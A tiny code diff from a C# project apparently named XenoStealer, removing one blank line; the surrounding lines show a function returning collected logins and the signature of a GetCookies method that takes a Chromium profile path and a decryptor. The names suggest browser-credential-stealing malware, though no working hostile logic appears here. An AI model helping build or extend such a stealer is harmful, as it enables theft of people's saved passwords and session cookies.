@@ -192,7 +192,6 @@ namespace XenoStealer
             }
         
             return logins.ToArray();
-        
         }
         public static DataExtractionStructs.ChromiumCookie[] GetCookies(string profilePath, ChromeDecryptor decryptor) 
         {
